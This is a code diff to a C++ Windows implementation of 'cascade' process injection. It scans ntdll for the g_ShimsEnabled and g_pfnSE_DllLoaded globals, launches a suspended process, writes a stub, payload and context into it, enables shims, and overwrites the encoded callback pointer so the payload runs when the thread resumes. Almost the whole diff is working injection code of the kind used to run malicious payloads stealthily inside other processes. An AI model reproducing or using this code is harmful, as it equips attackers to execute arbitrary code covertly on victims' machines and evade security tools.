@@ -1,5 +1,6 @@
 #include "core/Macros.hpp"
 #include "core/CascadeInject.hpp"
+#include <cstdio>
 #include <windows.h>
 #include <ntstatus.h>
 #ifdef INJ_CASCADE
@@ -51,33 +52,42 @@ PVOID EncodeFnPointer(IN PVOID ptr) {
     return C_PTR(_rotr64(userCookie ^ U_PTR(ptr), userCookie & 0x3F));
 }
 
-VOID FindOffset(IN OUT PVOID* g_pfnSE_DllLoaded, IN OUT PVOID* g_ShimsEnabled) {
-    PULONG  ptr = nullptr;
-    ULONG   offset1 = 0,
-            offset2 = 0;
+void FindOffset(PVOID* g_pfnSE_DllLoaded, PVOID* g_ShimsEnabled) {
+    PULONG ptr = nullptr;
+    ULONG offset1 = 0, offset2 = 0;
+    int i = 0;
 
-    ptr = reinterpret_cast<PULONG>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlQueryDepthSList"));
+    // Get the address of RtlUnlockMemoryBlockLookaside in ntdll.dll
+    ptr = reinterpret_cast<PULONG>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUnlockMemoryBlockLookaside"));
+    if (!ptr) {
+        return;
+    }
 
-    for (int i = 0; i != 2;) {
-        if ((*reinterpret_cast<PWORD>(ptr)) == 0xCCC3) {
+    // Scan until the end of LdrpInitializeDllPath
+    while (i != 6) {
+        if (*reinterpret_cast<PWORD>(ptr) == 0xCCC3) {
             ++i;
         }
-        ++ptr;
+        ptr = reinterpret_cast<PULONG>(reinterpret_cast<PBYTE>(ptr) + 1);
     }
 
-    while ( ((*reinterpret_cast<PLONG>(ptr)) & 0xFFFFFF) != 0x3D8B48) {
-        ++ptr;
+    // Scan until we find the pattern 0x488b3d (mov rdi, qword [rel g_pfnSE_DllLoaded])
+    while ((*reinterpret_cast<PLONG>(ptr) & 0xFFFFFF) != 0x3D8B48) {
+        ptr = reinterpret_cast<PULONG>(reinterpret_cast<PBYTE>(ptr) + 1);
     }
 
-    offset1 = *reinterpret_cast<PULONG>(ptr + 3);
-    *g_pfnSE_DllLoaded = reinterpret_cast<PVOID>(ptr + offset1 + 7);
+    // Retrieve the offset for g_pfnSE_DllLoaded
+    offset1 = *reinterpret_cast<PULONG>(reinterpret_cast<PBYTE>(ptr) + 3);
+    *g_pfnSE_DllLoaded = reinterpret_cast<PVOID>(reinterpret_cast<PBYTE>(ptr) + offset1 + 7);
 
-    while ( ((*reinterpret_cast<PLONG>(ptr)) & 0xFFFFFF) != 0x253844) {
-        ++ptr;
+    // Scan until we find the pattern 0x2D3844 (cmp byte [rel g_ShimsEnabled], r13b)
+    while ((*reinterpret_cast<PLONG>(ptr) & 0xFFFFFF) != 0x2D3844) {
+        ptr = reinterpret_cast<PULONG>(reinterpret_cast<PBYTE>(ptr) + 1);
     }
 
-    offset2 = *reinterpret_cast<PULONG>(ptr + 3);
-    *g_ShimsEnabled = reinterpret_cast<PVOID>(ptr + offset2 + 7);
+    // Retrieve the offset for g_ShimsEnabled
+    offset2 = *reinterpret_cast<PULONG>(reinterpret_cast<PBYTE>(ptr) + 3);
+    *g_ShimsEnabled = reinterpret_cast<PVOID>(reinterpret_cast<PBYTE>(ptr) + offset2 + 7);
 }
 
 NTSTATUS CascadeInject(IN PWSTR processName, IN PVOID payload, IN SIZE_T payloadSize, IN PVOID context, IN SIZE_T contextSize) {
@@ -89,19 +99,24 @@ NTSTATUS CascadeInject(IN PWSTR processName, IN PVOID payload, IN SIZE_T payload
                         g_pfnSE_DllLoaded   = nullptr,
                         g_ShimsEnabled      = nullptr;
     UINT_PTR            g_Value             = 0;
+    WCHAR               commandLine[1024];
+    PVOID               SecMrData         = {};
+    PVOID               SecData           = {};
 
 
     if (!processName || !payload) {
         return STATUS_INVALID_PARAMETER;
     }
 
-    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-    RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
-    si.cb = sizeof(STARTUPINFOW);
+    RtlSecureZeroMemory(&pi, sizeof(pi));
+    RtlSecureZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+
+    wcscpy_s(commandLine, processName);
 
     if (!CreateProcessW(
         nullptr,
-        processName,
+        commandLine,
         nullptr,
         nullptr,
         FALSE,
@@ -131,6 +146,9 @@ NTSTATUS CascadeInject(IN PWSTR processName, IN PVOID payload, IN SIZE_T payload
     if (!g_pfnSE_DllLoaded || !g_ShimsEnabled) {
         return STATUS_UNSUCCESSFUL;
     }
+
+    printf( "[*] g_ShimsEnabled   : %p\n", g_ShimsEnabled    );
+    printf( "[*] g_pfnSE_DllLoaded: %p\n", g_pfnSE_DllLoaded );
 
     g_Value = U_PTR(stub) + sizeof(cascade_stub_x64);
     memcpy(&cascade_stub_x64[16], &g_Value, sizeof(PVOID));
@@ -162,7 +180,50 @@ NTSTATUS CascadeInject(IN PWSTR processName, IN PVOID payload, IN SIZE_T payload
         return STATUS_UNSUCCESSFUL;
     }
 
+    if (context) {
+        offset += payloadSize;
+        if (!WriteProcessMemory(
+            pi.hProcess,
+            C_PTR(U_PTR(stub) + offset),
+            context,
+            contextSize,
+            nullptr)) {
+            return STATUS_UNSUCCESSFUL;
+        }
+    }
 
+    g_Value = TRUE;
+    if (!WriteProcessMemory(
+        pi.hProcess,
+        g_ShimsEnabled,
+        &g_Value,
+        sizeof(BYTE),
+        nullptr)) {
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    g_Value = U_PTR(EncodeFnPointer(stub));
+    if (!WriteProcessMemory(
+        pi.hProcess,
+        g_pfnSE_DllLoaded,
+        &g_Value,
+        sizeof(PVOID),
+        nullptr)) {
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    if (!ResumeThread(pi.hThread)) {
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    if (pi.hThread) {
+        CloseHandle(pi.hThread);
+    }
+
+    if (pi.hProcess) {
+        CloseHandle(pi.hProcess);
+    }
+    return STATUS_SUCCESS;
 }
 
 #endif
